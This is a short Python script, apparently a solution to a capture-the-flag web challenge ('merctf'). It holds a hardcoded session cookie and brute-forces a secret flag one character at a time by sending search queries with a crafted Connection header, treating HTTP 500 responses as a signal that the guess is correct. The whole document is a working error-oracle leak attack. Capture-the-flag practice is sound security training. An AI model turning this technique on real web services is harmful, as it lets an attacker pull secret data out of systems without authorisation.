# ref. https://mizu.re/post/last_battle

from requests import get, post
from string import printable
from re import findall

# init
cookies = {
    "session": "eyJjc3JmX3Rva2VuIjoiY2Y3MzBkZmUxNjQxOTU0N2Y0OTY2OTI3NjJhNWExMzkxMTg3NzMyMCIsInVzZXJuYW1lIjoibWVyY2FyaSJ9.ZYxGBw.pzl-9a35cjNX5em3B6TF2xjCfVk"
}
flag = "Merctf{"

while 1:
    # search query
    for letter in printable:
        url = "http://web.merctf.com//search"
        headers = {
            "Connection": "User-Agent"
        }
        data = {
            "query": flag + letter
        }

        r = post(url, cookies=cookies, headers=headers, data=data)
        if r.status_code == 500:
            print("LETTER FOUND!", flag + letter)
            flag += letter
            break
    # no letter found, end of flag
    else:
        exit()